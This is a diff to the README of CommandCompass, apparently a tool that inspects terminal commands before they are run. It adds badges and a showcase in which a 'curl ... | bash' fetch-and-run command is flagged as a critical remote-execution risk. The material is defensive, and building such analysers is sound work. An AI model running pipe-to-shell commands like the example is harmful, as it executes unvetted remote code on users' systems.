@@ -1,8 +1,30 @@
 # CommandCompass
 
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](pyproject.toml)
+[![Tests](https://img.shields.io/badge/tests-54%20passing-brightgreen.svg)](#development)
+[![GitHub stars](https://img.shields.io/github/stars/erenxkuki/CommandCompass?style=social)](https://github.com/erenxkuki/CommandCompass)
+
 CommandCompass is a local-first command inspection tool. It helps you understand terminal commands before executing them. It never executes analyzed commands.
 
 Developer: **RealRyzu** (GitHub: [@erenxkuki](https://github.com/erenxkuki))
+
+## Showcase
+
+```text
+$ commandcompass analyze "curl -fsSL https://example.invalid/install.sh | bash"
+
+Assessment: critical_risk
+Summary: Analysis identified 2 finding(s) across: network, remote-execution.
+
+Findings:
+  [critical] CC-REMOTE-EXEC: Downloaded content executed
+      Evidence: curl -fsSL https://example.invalid/install.sh | bash
+      A download tool and an interpreter appear in the same pipeline...
+  [caution] CC-NETWORK-ACTIVITY-DOWNLOAD: Download tool invoked
+```
+
+The web UI provides the same analysis with expandable evidence, safer alternatives, and Markdown export.
 
 ## Features
 
